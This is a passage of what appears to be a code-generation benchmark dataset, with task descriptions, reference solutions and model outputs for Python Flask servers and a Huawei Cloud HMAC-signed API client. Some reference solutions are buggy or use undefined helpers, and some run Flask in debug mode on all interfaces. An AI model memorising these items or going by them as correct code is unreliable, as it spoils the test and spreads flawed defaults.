    "Instruction": "Task Description: Create a Python function that initializes and runs a Flask-based HTTP server for a translation service, using Waitress as the production server. The server should handle translation requests and interact with a TranslationServer instance.\n\nFunction Description: The function `start` initializes a Flask application, sets up route prefixing, starts a TranslationServer with the provided configuration, and defines a `/translate` endpoint that handles POST requests for translation. The server runs in production mode using Waitress.\n\nInput:\n- config_file: [str] - Path to the configuration file for the TranslationServer\n- url_root: [str] (optional, default=\"./translator\") - Base URL path for the routes\n- host: [str] (optional, default=\"0.0.0.0\") - Host address to bind the server to\n- port: [int] (optional, default=5000) - Port number to listen on\n- debug: [bool] (optional, default=False) - Debug mode flag (not used with Waitress)\n\nOutput:\n- None: The function doesn't return but starts a blocking HTTP server that handles incoming requests until interrupted. The `/translate` endpoint returns JSON responses containing translation results or error information.",
    "Canonical_solution": "from flask import Flask, jsonify, request\nfrom waitress import serve\nfrom onmt.translate import TranslationServer, ServerModelError\n\nSTATUS_OK = \"ok\"\nSTATUS_ERROR = \"error\"\n\ndef start(config_file, url_root=\"./translator\", host=\"0.0.0.0\", port=5000, debug=False):\n    def prefix_route(route_function, prefix=\"\", mask=\"{0}{1}\"):\n        def newroute(route, *args, **kwargs):\n            return route_function(mask.format(prefix, route), *args, **kwargs)\n        return newroute\n\n    app = Flask(__name__)\n    app.route = prefix_route(app.route, url_root)\n    translation_server = TranslationServer()\n    translation_server.start(config_file)\n\n    @app.route(\"/translate\", methods=[\"POST\"])\n    def translate():\n        inputs = request.get_json(force=True)\n        out = {}\n        try:\n            trans, scores, n_best, _, aligns, align_scores = translation_server.run(\n                inputs\n            )\n            assert len(trans) == len(inputs) * n_best\n            assert len(scores) == len(inputs) * n_best\n            assert len(aligns) == len(inputs) * n_best\n\n            out = [[] for _ in range(n_best)]\n            for i in range(len(trans)):\n                response = {\n                    \"src\": inputs[i // n_best][\"src\"],\n                    \"tgt\": trans[i],\n                    \"n_best\": n_best,\n                    \"pred_score\": scores[i],\n                }\n                if len(aligns[i]) > 0 and aligns[i][0] is not None:\n                    response[\"align\"] = aligns[i]\n                    response[\"align_score\"] = align_scores[i]\n                out[i % n_best].append(response)\n        except ServerModelError as e:\n            model_id = inputs[0].get(\"id\")\n            translation_server.models[model_id].unload()\n            out[\"error\"] = str(e)\n            out[\"status\"] = STATUS_ERROR\n        return jsonify(out)\n\n    serve(app, host=host, port=port)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "```python\nfrom flask import Flask, request, jsonify\nfrom waitress import serve\nimport os\n\nclass TranslationServer:\n    def __init__(self, config_file):\n        self.config = self._load_config(config_file)\n\n    def _load_config(self, config_file):\n        if not os.path.exists(config_file):\n            raise FileNotFoundError(f\"Config file {config_file} not found.\")\n        return {\"lang_pairs\": [\"en-fr\", \"fr-en\"]}\n\n    def translate(self, text, source_lang, target_lang):\n        if f\"{source_lang}-{target_lang}\" not in self.config[\"lang_pairs\"]:\n            raise ValueError(f\"Unsupported language pair: {source_lang}-{target_lang}\")\n        return f\"[Translated] {text}\"\n\ndef start(config_file, url_root=\"./translator\", host=\"0.0.0.0\", port=5000, debug=False):\n    app = Flask(__name__)\n    translation_server = TranslationServer(config_file)\n\n    @app.route(f\"{url_root}/translate\", methods=[\"POST\"])\n    def translate():\n        data = request.get_json()\n        text = data.get(\"text\")\n        source_lang = data.get(\"source_lang\", \"en\")\n        target_lang = data.get(\"target_lang\", \"fr\")\n\n        if not text:\n            return jsonify({\"error\": \"Missing text parameter\"}), 400\n\n        try:\n            translated_text = translation_server.translate(text, source_lang, target_lang)\n            return jsonify({\"translated_text\": translated_text})\n        except Exception as e:\n            return jsonify({\"error\": str(e)}), 500\n\n    serve(app, host=host, port=port)\n```"
  },
  {
    "Task_id": 13,
    "Instruction": "Task Description: Implement an HTTP client function that sends authenticated requests to a Huawei Cloud API endpoint using HMAC-SHA256 signature for authentication.\n\nFunction Description: The function `request` sends HTTP requests to a specified API endpoint with proper authentication headers. It handles request signing, connection management, and response processing. The authentication follows Huawei Cloud's SDK-HMAC-SHA256 algorithm.\n\nInput:\n- `method`: [str] - HTTP method (e.g., 'GET', 'POST')\n- `path`: [str] - API endpoint path\n- `param`: [dict, optional] - Query parameters to be appended to the URL\n- `body`: [str/dict, optional] - Request body content (converted to JSON if dict)\n- `**params`: [dict, optional] - Additional query parameters\n\nOutput:\n- [dict] - Parsed JSON response from the API if successful\n- Raises Exception if HTTP status code indicates failure (status \u2265 300)\n\nNote: The function relies on global configuration in `Config` class (ID, TOKEN, PROXY) and API settings in `API` class (SCHEME, SITE). It performs the following operations:\n1. Constructs proper request headers with timestamp\n2. Generates HMAC-SHA256 signature\n3. Establishes HTTPS connection (with proxy support if configured)\n4. Sends request and processes response\n5. Handles errors and returns parsed data",
    "Canonical_solution": "from hashlib import sha256\nfrom hmac import new as hmac\nfrom binascii import hexlify\nfrom json import loads as jsondecode, dumps as jsonencode\nfrom logging import debug, info, warning\nfrom datetime import datetime\nfrom http.client import HTTPSConnection\nfrom urllib.parse import urlencode\n\nBasicDateFormat = \"%Y%m%dT%H%M%SZ\"\nAlgorithm = \"SDK-HMAC-SHA256\"\n\nclass Config:\n    ID = \"id\"  # AK\n    TOKEN = \"TOKEN\"  # AS\n    PROXY = None  # \u4ee3\u7406\u8bbe\u7f6e\n    TTL = None\n\nclass API:\n    SCHEME = 'https'\n    SITE = 'dns.myhuaweicloud.com'  # API endpoint\n\ndef request(method, path, param=None, body=None, **params):\n    if param:\n        params.update(param)\n\n    query = urlencode(sorted(params.items()))\n    headers = {\"content-type\": \"application/json\"}\n    headers[\"X-Sdk-Date\"] = datetime.strftime(datetime.utcnow(), BasicDateFormat)\n    headers[\"host\"] = API.SITE\n    sign_headers = []\n    for key in headers:\n        sign_headers.append(key.lower())\n    sign_headers.sort()\n\n    if body is None:\n        body = \"\"\n\n    hex_encode = HexEncodeSHA256Hash(body.encode('utf-8'))\n    canonical_headers = CanonicalHeaders(headers, sign_headers)\n\n    if path[-1] != '/':\n        sign_path = path + \"/\"\n    else:\n        sign_path = path\n\n    canonical_request = \"%s\\n%s\\n%s\\n%s\\n%s\\n%s\" % (method.upper(), sign_path, query,\n                                                    canonical_headers, \";\".join(sign_headers), hex_encode)\n\n    hashed_canonical_request = HexEncodeSHA256Hash(canonical_request.encode('utf-8'))\n    str_to_sign = \"%s\\n%s\\n%s\" % (Algorithm, headers['X-Sdk-Date'], hashed_canonical_request)\n\n    secret = Config.TOKEN\n    signature = hmac(secret.encode('utf-8'), str_to_sign.encode('utf-8'), digestmod=sha256).digest()\n    signature = hexlify(signature).decode()\n    auth_header = \"%s Access=%s, SignedHeaders=%s, Signature=%s\" % (\n        Algorithm, Config.ID, \";\".join(sign_headers), signature)\n    headers['Authorization'] = auth_header\n\n    if Config.PROXY:\n        conn = HTTPSConnection(Config.PROXY)\n        conn.set_tunnel(API.SITE, 443)\n    else:\n        conn = HTTPSConnection(API.SITE)\n    conn.request(method, API.SCHEME + \"://\" + API.SITE + path + '?' + query, body, headers)\n    info(API.SCHEME + \"://\" + API.SITE + path + '?' + query, body)\n    resp = conn.getresponse()\n    data = resp.read().decode('utf8')\n    resp.close()\n    if resp.status < 200 or resp.status >= 300:\n        warning('%s : error[%d]: %s', path, resp.status, data)\n        raise Exception(data)\n    else:\n        data = jsondecode(data)\n        debug('%s : result:%s', path, data)\n        return data\n\ndef HexEncodeSHA256Hash(data):\n    sha = sha256()\n    sha.update(data)\n    return sha.hexdigest()\n\ndef CanonicalHeaders(headers, signed_headers):\n    a = []\n    __headers = {}\n    for key in headers:\n        key_encoded = key.lower()\n        value = headers[key]\n        value_encoded = value.strip()\n        __headers[key_encoded] = value_encoded\n    for key in signed_headers:\n        a.append(key + \":\" + __headers[key])\n    return '\\n'.join(a) + \"\\n\"",
    "Code_level": "Function-level",
    "FSMID_for_test": 56,
    "right_result": "import base64\nimport hashlib\nimport hmac\nimport json\nimport time\nimport urllib.parse\nfrom http.client import HTTPSConnection\nfrom typing import Optional, Dict, Any\n\nclass Config:\n    ID = \"your-access-key-id\"\n    TOKEN = \"your-secret-access-key\"\n    PROXY = None  # Format: \"host:port\"\n\nclass API:\n    SCHEME = \"https\"\n    SITE = \"api.huaweicloud.com\"\n\ndef request(\n    method: str,\n    path: str,\n    param: Optional[Dict[str, Any]] = None,\n    body: Optional[Any] = None,\n    **params: Any\n) -> Dict[str, Any]:\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"X-Sdk-Date\": time.strftime(\"%Y%m%dT%H%M%SZ\", time.gmtime())\n    }\n\n    query_params = {**param, **params} if param else params\n    encoded_params = urllib.parse.urlencode(query_params)\n    url_path = f\"{path}?{encoded_params}\" if encoded_params else path\n\n    if isinstance(body, dict):\n        body_str = json.dumps(body)\n    elif body is not None:\n        body_str = str(body)\n    else:\n        body_str = \"\"\n\n    string_to_sign = \"\\n\".join([\n        method.upper(),\n        url_path,\n        \"\",\n        headers[\"X-Sdk-Date\"],\n        hashlib.sha256(body_str.encode()).hexdigest()\n    ])\n\n    signature = hmac.new(\n        Config.TOKEN.encode(), string_to_sign.encode(), hashlib.sha256\n    ).digest()\n\n    authorization_header = (\n        f\"SDK-HMAC-SHA256 \"\n        f\"Access={Config.ID}, \"\n        f\"SignedHeaders=host;x-sdk-date, \"\n        f\"Signature={hmac.new(Config.TOKEN.encode(), string_to_sign.encode(), hashlib.sha256).hexdigest()}\"\n    )\n\n    headers[\"Authorization\"] = authorization_header\n\n    proxy_host, proxy_port = None, None\n    if Config.PROXY:\n        proxy_parts = Config.PROXY.split(\":\")\n        proxy_host = proxy_parts[0]\n        proxy_port = int(proxy_parts[1]) if len(proxy_parts) > 1 else 8080\n\n    connection_host = proxy_host if proxy_host else API.SITE\n    connection_port = proxy_port if proxy_host else 443\n\n    conn = HTTPSConnection(connection_host, connection_port)\n    if proxy_host:\n        conn.set_tunnel(API.SITE)\n\n    try:\n        conn.request(method.upper(), f\"{API.SCHEME}://{API.SITE}{url_path}\", body=body_str, headers=headers)\n        response = conn.getresponse()\n        data = response.read().decode()\n        \n        if response.status >= 300:\n            raise Exception(f\"Request failed with status {response.status}: {data}\")\n        \n        return json.loads(data)\n    finally:\n        conn.close()"
  },
  {
    "Task_id": 130,
    "Instruction": "Task Description: Create a Flask-based HTTP server with multiple endpoints to handle different types of requests, including delayed responses, request method identification, and JSON responses.\n\nFunction Description: The code implements three Flask route handlers that demonstrate different HTTP server functionalities. Each function handles a specific endpoint and performs a distinct operation.\n\nInput:\n- For '/respond' endpoint: \n  - Query parameter: 'time' (integer) - milliseconds to sleep before responding\n- For '/request_type' endpoint: \n  - None (automatically receives request method via Flask's request object)\n- For '/json' endpoint: \n  - None\n\nOutput:\n- For '/respond' endpoint: \n  - Response text: 'Response from Flask' after specified delay\n  - Header: Sets 'Access-Control-Allow-Origin' to '*'\n- For '/request_type' endpoint: \n  - Response text: String indicating the HTTP request method used\n  - Header: Sets 'Access-Control-Allow-Origin' to '*'\n- For '/json' endpoint: \n  - Response: JSON object {'resp': 'Hello JSON!'}",
    "Canonical_solution": "from flask import Flask, request, make_response\nfrom time import sleep\n\napp = Flask(__name__)\n\n@app.route('/respond')\ndef respond():\n    time_to_sleep = int(request.args.get('time')) / 1000\n    sleep(time_to_sleep)\n    resp = make_response('Response from Flask')\n    resp.headers['Access-Control-Allow-Origin'] = '*'\n    return resp\n\n@app.route('/request_type')\ndef request_type():\n    resp = make_response('Request Type: ' + request.method)\n    resp.headers['Access-Control-Allow-Origin'] = '*'\n    return resp\n\n@app.route('/json')\ndef json():\n    return {resp:'Hello JSON!'}",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nimport time\n\napp = Flask(__name__)\n\n@app.route('/respond')\ndef respond():\n    delay = request.args.get('time', default=0, type=int)\n    time.sleep(delay / 1000.0)\n    response = app.make_response('Response from Flask')\n    response.headers['Access-Control-Allow-Origin'] = '*'\n    return response\n\n@app.route('/request_type')\ndef request_type():\n    req_method = request.method\n    response = app.make_response(req_method)\n    response.headers['Access-Control-Allow-Origin'] = '*'\n    return response\n\n@app.route('/json')\ndef json_response():\n    return jsonify({'resp': 'Hello JSON!'})\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 131,
    "Instruction": "Task Description: Create a Flask-based HTTP server for handling subscription requests that generates configuration files for various proxy clients based on user agent and request parameters.\n\nClass Description: SubscriptionServer is a Flask application wrapper that handles subscription requests and generates appropriate configuration files for different proxy clients (Clash, WireGuard, Surge, etc.). It includes route setup, request handling, and response generation logic.\n\nAttributes:\n- app: Flask - The Flask application instance\n- logger: logging.Logger - Logger instance for application logging\n- fake: Faker - Faker instance for generating random names\n\nMethods:\n- __init__(app_name: str = \"web\", logger: logging.Logger = None) -> None - Initializes the Flask application, sets up logging, and configures routes\n- _setup_routes() -> None - Sets up the Flask routes for handling subscription requests\n- _handle_subscription(sub_type: str) -> Any - Processes subscription requests and generates appropriate configuration files based on the subscription type\n- run(host: str = '0.0.0.0', port: int = 5000, debug: bool = True) -> None - Starts the Flask server with specified host, port and debug settings",
    "Canonical_solution": "from flask import Flask, request, make_response\nimport logging\nfrom faker import Faker\nfrom typing import Dict, Any\n\nclass SubscriptionServer:\n    def __init__(self, app_name: str = \"web\", logger: logging.Logger = None):\n        self.app = Flask(app_name)\n        self.logger = logger if logger else logging.getLogger()\n        self.fake = Faker()\n        \n        # Configure logger\n        for handler in self.app.logger.handlers:\n            self.app.logger.removeHandler(handler)\n        for handler in self.logger.handlers:\n            self.app.logger.addHandler(handler)\n        self.app.logger.setLevel(self.logger.level)\n        \n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.route('/sub', methods=['GET'])\n        def httpAutoSub():\n            user_agent = request.headers.get('User-Agent', 'unknown').lower()\n            sub_type = getSubTypeFromUA(user_agent)\n            return self._handle_subscription(sub_type)\n\n        @self.app.route('/api/<string:sub_type>', methods=['GET'])\n        def httpSubscription(sub_type: str):\n            return self._handle_subscription(sub_type)\n\n    def _handle_subscription(self, sub_type: str) -> Any:\n        user_agent = request.headers.get('User-Agent', 'unknown').lower()\n        account = getCurrentAccount(self.logger)\n        best = request.args.get('best', 'false').lower() == \"true\" or False\n        random_name = request.args.get('randomName', 'false').lower() == \"true\" or False\n        proxy_format = request.args.get('proxyFormat', 'full').lower()\n        ipv6 = request.args.get('ipv6', 'false').lower() == \"true\" or False\n\n        headers = {\n            'Content-Type': 'application/x-yaml; charset=utf-8',\n            \"Subscription-Userinfo\": f\"upload=0; download={account.usage}; total={account.quota}; \"\n                                    f\"expire=253388144714\"\n        }\n\n        is_android = \"android\" in user_agent\n\n        if sub_type == \"clash\":\n            file_data = generateClashSubFile(account, self.logger, best=best, proxy_format=proxy_format,\n                                           random_name=random_name, is_android=is_android, is_meta=False, ipv6=ipv6)\n            file_name = f'Clash-{self.fake.color_name()}.yaml'\n        elif sub_type == \"meta\":\n            file_data = generateClashSubFile(account, self.logger, best=best, proxy_format=proxy_format,\n                                           random_name=random_name, is_android=is_android, is_meta=True, ipv6=ipv6)\n            file_name = f'Clash-{self.fake.color_name()}.yaml'\n        elif sub_type == \"wireguard\":\n            file_data = generateWireguardSubFile(account, self.logger, best=best, ipv6=ipv6)\n            file_name = f'WireGuard-{self.fake.lexify(\"????????????\").lower()}.conf'\n        elif sub_type == \"surge\":\n            file_data = generateSurgeSubFile(account, self.logger, best=best, random_name=random_name,\n                                           proxy_format=proxy_format, ipv6=ipv6)\n            file_name = f'Surge-{self.fake.color_name()}.conf'\n        elif sub_type == 'shadowrocket':\n            file_data = generateShadowRocketSubFile(account, self.logger, best=best, random_name=random_name, ipv6=ipv6)\n            file_name = f'Shadowrocket-{self.fake.color_name()}.conf'\n        elif sub_type == 'sing-box':\n            file_data = generateSingBoxSubFile(account, self.logger, best=best, random_name=random_name, ipv6=ipv6)\n            file_name = f'SingBox-{self.fake.color_name()}.json'\n        elif sub_type == 'loon':\n            file_data = generateLoonSubFile(account, self.logger, best=best, random_name=random_name, ipv6=ipv6)\n            file_name = f'Loon-{self.fake.color_name()}.conf'\n        elif sub_type == \"only_proxies\":\n            file_data = generateClashSubFile(account, self.logger, best=best, proxy_format='with_groups',\n                                           random_name=random_name, ipv6=ipv6)\n            file_name = f'Clash-{self.fake.color_name()}.yaml'\n        else:\n            return {\n                'code': 400,\n                'message': 'Unsupported sub type.'\n            }, 400\n\n        headers['Content-Disposition'] = f'attachment; filename=\"{file_name}\"'\n        response = make_response(file_data)\n        response.headers = headers\n        return response\n\n    def run(self, host: str = '0.0.0.0', port: int = 5000, debug: bool = True):\n        self.app.run(host=host, port=port, debug=debug)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, Response\nimport logging\nfrom faker import Faker\nfrom typing import Any\n\nclass SubscriptionServer:\n    def __init__(self, app_name: str = \"web\", logger: logging.Logger = None) -> None:\n        self.app = Flask(app_name)\n        self.logger = logger or logging.getLogger(__name__)\n        self.fake = Faker()\n        self._setup_routes()\n\n    def _setup_routes(self) -> None:\n        @self.app.route('/subscribe/<sub_type>', methods=['GET'])\n        def handle_subscription(sub_type: str) -> Any:\n            return self._handle_subscription(sub_type)\n\n    def _handle_subscription(self, sub_type: str) -> Any:\n        user_agent = request.headers.get('User-Agent', '').lower()\n        config_content = \"\"\n\n        if 'clash' in user_agent:\n            config_content = self._generate_clash_config(sub_type)\n        elif 'wireguard' in user_agent:\n            config_content = self._generate_wireguard_config(sub_type)\n        elif 'surge' in user_agent:\n            config_content = self._generate_surge_config(sub_type)\n        else:\n            config_content = self._generate_generic_config(sub_type)\n\n        return Response(config_content, mimetype='application/octet-stream')\n\n    def _generate_clash_config(self, sub_type: str) -> str:\n        return f\"# Clash Config for {sub_type}\\nproxies:\\n  - name: {self.fake.word()}-clash\\n    type: http\\n    server: {self.fake.ipv4()}\\n    port: {self.fake.port_number()}\\n\"\n\n    def _generate_wireguard_config(self, sub_type: str) -> str:\n        return f\"[Interface]\\nPrivateKey = {self.fake.sha256()}\\nAddress = {self.fake.ipv4()}/32\\nDNS = {self.fake.ipv4()}\\n\\n[Peer]\\nPublicKey = {self.fake.sha256(raw_output=False)}\\nEndpoint = {self.fake.domain_name()}:{self.fake.port_number()}\\n\"\n\n    def _generate_surge_config(self, sub_type: str) -> str:\n        return f\"[General]\\ndns-server = {self.fake.ipv4()}\\n\\n[Proxy]\\n{self.fake.word()} = secure-http, {self.fake.domain_name()}, port={self.fake.port_number()}, obfs=http\\n\"\n\n    def _generate_generic_config(self, sub_type: str) -> str:\n        return f\"server={self.fake.ipv4()}\\nport={self.fake.port_number()}\\ntype={sub_type}\\nusername={self.fake.user_name()}\\npassword={self.fake.password()}\\n\"\n\n    def run(self, host: str = '0.0.0.0', port: int = 5000, debug: bool = True) -> None:\n        self.app.run(host=host, port=port, debug=debug)"
  },
  {
    "Task_id": 132,
    "Instruction": "Task Description: Create a Flask web application that serves HTML templates and CSV files based on user requests.\n\nFunction Description: The application consists of two main routes: one for serving the main HTML page and another for serving CSV files based on a user ID parameter.\n\nInput:\n- For index(): No input parameters\n- For get_data_for_uid(uid): \n  uid: int - The user ID used to locate the corresponding CSV file\n\nOutput:\n- For index(): Returns the rendered main.html template\n- For get_data_for_uid(uid): Returns the CSV file corresponding to the given user ID or raises a 404 error if not found",
    "Canonical_solution": "from flask import Flask, render_template, send_file\n\napp = Flask('stalky')\n\n@app.route('/')\ndef index():\n    return render_template(\"main.html\")\n\n@app.route('/data/<int:uid>')\ndef get_data_for_uid(uid):\n    return send_file(\"generated_graphs/csv/{uid}.csv\".format(uid=uid))\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', debug=True)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, render_template, send_from_directory, abort\nimport os\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return render_template('main.html')\n\n@app.route('/data/<int:uid>.csv')\ndef get_data_for_uid(uid):\n    csv_dir = 'data_files'\n    filename = f'user_{uid}.csv'\n    if not os.path.exists(os.path.join(csv_dir, filename)):\n        abort(404)\n    return send_from_directory(csv_dir, filename)\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 133,
    "Instruction": "Task Description: Create a Flask-based HTTP server for model inference that provides RESTful APIs to list available models and perform inference using specified models.\n\nClass Description: InferenceServer is a class that encapsulates a Flask web server for serving machine learning models. It loads models from specified directories, sets up API endpoints for model listing and inference, and handles JSON serialization of NumPy data types.\n\nAttributes:\n- app: [Flask] - The Flask application instance\n- api: [flask_restplus.Api] - RESTPlus API instance for route management\n- inferencers: [dict] - Dictionary storing loaded model inferencers with IDs as keys\n\nMethods:\n- __init__([models_dirs: list[str]]) -> None - Initializes the server and loads models from specified directories\n- _load_models([models_dirs: list[str]]) -> None - Private method to load models from given directories\n- _setup_routes() -> None - Private method to define API routes and handlers\n- run([host: str, port: int]) -> None - Starts the Flask server on specified host and port\n\nNested Classes:\n- ModelListEndpoint(Resource) - Handles GET requests to list available models\n  - get() -> list[dict] - Returns list of loaded models with their metadata\n\n- InferenceEndpoint(Resource) - Handles POST requests for model inference\n  - post([model_id: int]) -> dict/str - Performs inference using specified model and returns results\n\nHelper Functions:\n- resp_json([data: Any, code: int, headers: dict]) -> flask.Response - Custom JSON response handler with NumPy serialization support\n\nCustom Encoder:\n- NumpyEncoder(json.JSONEncoder) - Custom JSON encoder that handles NumPy arrays and float32 types",
    "Canonical_solution": "from flask import Flask, request, make_response\nfrom flask_cors import CORS\nfrom flask_restplus import Api, Resource\nimport json\nimport numpy as np\n\nclass NumpyEncoder(json.JSONEncoder):\n    def default(self, obj):\n        if isinstance(obj, np.ndarray):\n            return obj.tolist()\n        if isinstance(obj, np.float32):\n            return str(obj)\n        return json.JSONEncoder.default(self, obj)\n\nclass InferenceServer:\n    def __init__(self, models_dirs=[\"saved_models\", \"base_models\"]):\n        self.app = Flask(__name__)\n        CORS(self.app)\n        self.api = Api(self.app, debug=True, validate=True, version=\"1.0\", title=\"FARM NLP APIs\")\n        self.app.config[\"JSON_SORT_KEYS\"] = True\n        self.app.config[\"RESTPLUS_VALIDATE\"] = True\n        \n        self.inferencers = {}\n        self._load_models(models_dirs)\n        self._setup_routes()\n\n    def _load_models(self, models_dirs):\n        model_paths = []\n        for model_dir in models_dirs:\n            path = Path(model_dir)\n            if path.is_dir():\n                models = [f for f in path.iterdir() if f.is_dir()]\n                model_paths.extend(models)\n\n        for idx, model_dir in enumerate(model_paths):\n            self.inferencers[idx + 1] = Inferencer.load(str(model_dir), num_processes=0)\n\n    def _setup_routes(self):\n        @self.api.route(\"/models\")\n        class ModelListEndpoint(Resource):\n            def get(self):\n                resp = []\n                for idx, model in self.inferencers.items():\n                    prediction_type = model.model.prediction_heads[0].model_type\n                    _res = {\n                        \"id\": idx,\n                        \"name\": model.name,\n                        \"prediction_type\": prediction_type,\n                        \"language\": model.language,\n                    }\n                    resp.append(_res)\n                return resp\n\n        @self.api.route(\"/models/<int:model_id>/inference\")\n        class InferenceEndpoint(Resource):\n            def post(self, model_id):\n                model = self.inferencers.get(model_id, None)\n                if not model:\n                    return \"Model not found\", 404\n\n                dicts = request.get_json().get(\"input\", None)\n                if not dicts:\n                    return {}\n                results = model.inference_from_dicts(dicts=dicts)\n                return results[0]\n\n        @self.api.representation(\"application/json\")\n        def resp_json(data, code, headers=None):\n            resp = make_response(json.dumps(data, cls=NumpyEncoder), code)\n            resp.headers.extend(headers or {})\n            return resp\n\n    def run(self, host=\"0.0.0.0\", port=5000):\n        self.app.run(host=host, port=port)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "import os\nimport numpy as np\nfrom flask import Flask, Response, request\nfrom flask_restplus import Api, Resource\nimport json\n\nclass NumpyEncoder(json.JSONEncoder):\n    def default(self, obj):\n        if isinstance(obj, np.ndarray):\n            return obj.tolist()\n        elif isinstance(obj, np.float32):\n            return float(obj)\n        return super(NumpyEncoder, self).default(obj)\n\ndef resp_json(data, code=200, headers=None):\n    resp = Response(json.dumps(data, cls=NumpyEncoder), mimetype='application/json')\n    resp.status_code = code\n    if headers:\n        for key, value in headers.items():\n            resp.headers[key] = value\n    return resp\n\nclass Inferencer:\n    def __init__(self, model_id, model_dir):\n        self.model_id = model_id\n        self.model_dir = model_dir\n        self.metadata = {\n            'id': model_id,\n            'name': f\"Model_{model_id}\",\n            'description': f\"Model loaded from {model_dir}\"\n        }\n    \n    def infer(self, input_data):\n        return {\n            \"input_received\": input_data,\n            \"prediction\": np.float32(np.random.rand()),\n            \"activations\": np.random.rand(10).astype(np.float32)\n        }\n\nclass InferenceServer:\n    def __init__(self, models_dirs=None):\n        self.app = Flask(__name__)\n        self.api = Api(self.app)\n        self.inferencers = {}\n        self._load_models(models_dirs or [])\n        self._setup_routes()\n    \n    def _load_models(self, models_dirs):\n        model_id = 0\n        for model_dir in models_dirs:\n            if os.path.isdir(model_dir):\n                self.inferencers[model_id] = Inferencer(model_id, model_dir)\n                model_id += 1\n    \n    def _setup_routes(self):\n        class ModelListEndpoint(Resource):\n            def get(self):\n                return [inf.metadata for inf in server.inferencers.values()]\n        \n        class InferenceEndpoint(Resource):\n            def post(self, model_id):\n                if model_id not in server.inferencers:\n                    return resp_json({\"error\": \"Model not found\"}, 404)\n                \n                input_data = request.get_json()\n                if not input_data:\n                    return resp_json({\"error\": \"No input data provided\"}, 400)\n                \n                result = server.inferencers[model_id].infer(input_data)\n                return resp_json(result)\n        \n        self.api.add_resource(ModelListEndpoint, '/models')\n        self.api.add_resource(InferenceEndpoint, '/infer/<int:model_id>')\n    \n    def run(self, host='0.0.0.0', port=5000):\n        self.app.run(host=host, port=port)\n\nif __name__ == '__main__':\n    server = InferenceServer(['/path/to/model1', '/path/to/model2'])\n    server.run()"
  },
  {
    "Task_id": 134,
    "Instruction": "Task Description: Create a Flask-based web application for sentiment analysis of movie reviews that allows users to submit reviews, get sentiment predictions, and provide feedback to improve the classifier.\n\nClass Description: ReviewClassifier is a Flask web application that classifies movie reviews as positive or negative using a pre-trained classifier. It provides an interface for users to submit reviews, view predictions, and give feedback which is used to update the classifier and store in a SQLite database.\n\nAttributes:\n- app: [Flask] - The Flask application instance\n- clf: [sklearn classifier] - Pre-trained sentiment classifier loaded from pickle file\n- db: [str] - Path to SQLite database file for storing reviews\n- vect: [sklearn vectorizer] - Text vectorizer for feature extraction\n\nMethods:\n- __init__: [constructor]() -> None - Initializes the Flask app, loads classifier and vectorizer, sets up routes\n- classify: [classify](document: str) -> tuple[str, float] - Classifies a review document and returns (sentiment_label, probability)\n- train: [train](document: str, y: int) -> None - Updates classifier with new training example\n- sqlite_entry: [sqlite_entry](document: str, y: int) -> None - Stores review and sentiment in database\n- index: [index]() -> str - Renders main review submission form\n- results: [results]() -> str - Processes submitted review and renders prediction results\n- feedback: [feedback]() -> str - Handles user feedback and updates model/database\n- run: [run]() -> None - Starts the Flask development server",
    "Canonical_solution": "from flask import Flask, request, render_template\nfrom wtforms import Form, TextAreaField, validators\nimport pickle\nimport sqlite3\nimport os\nimport numpy as np\nfrom vectorizer import vect\n\nclass ReviewClassifier:\n    def __init__(self):\n        self.app = Flask(__name__)\n        cur_dir = os.path.dirname(__file__)\n        self.clf = pickle.load(open(os.path.join(cur_dir, 'pkl_objects', 'classifier.pkl'), 'rb'))\n        self.db = os.path.join(cur_dir, 'reviews.sqlite')\n        self.vect = vect\n        \n        self.app.route('/')(self.index)\n        self.app.route('/results', methods=['POST'])(self.results)\n        self.app.route('/thanks', methods=['POST'])(self.feedback)\n\n    def classify(self, document):\n        label = {0: 'negative', 1: 'positive'}\n        X = self.vect.transform([document])\n        y = self.clf.predict(X)[0]\n        proba = np.max(self.clf.predict_proba(X))\n        return label[y], proba\n\n    def train(self, document, y):\n        X = self.vect.transform([document])\n        self.clf.partial_fit(X, [y])\n\n    def sqlite_entry(self, document, y):\n        conn = sqlite3.connect(self.db)\n        c = conn.cursor()\n        c.execute(\"INSERT INTO review_db (review, sentiment, date) VALUES (?, ?, DATETIME('now'))\", (document, y))\n        conn.commit()\n        conn.close()\n\n    def index(self):\n        form = ReviewForm(request.form)\n        return render_template('reviewform.html', form=form)\n\n    def results(self):\n        form = ReviewForm(request.form)\n        if request.method == 'POST' and form.validate():\n            review = request.form['moviereview']\n            y, proba = self.classify(review)\n            return render_template('results.html',\n                                content=review,\n                                prediction=y,\n                                probability=round(proba*100, 2))\n        return render_template('reviewform.html', form=form)\n\n    def feedback(self):\n        feedback = request.form['feedback_button']\n        review = request.form['review']\n        prediction = request.form['prediction']\n\n        inv_label = {'negative': 0, 'positive': 1}\n        y = inv_label[prediction]\n        if feedback == 'Incorrect':\n            y = int(not(y))\n        self.train(review, y)\n        self.sqlite_entry(review, y)\n        return render_template('thanks.html')\n\n    def run(self):\n        self.app.run(debug=True)\n\nclass ReviewForm(Form):\n    moviereview = TextAreaField('',\n                            [validators.DataRequired(),\n                            validators.length(min=15)])",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
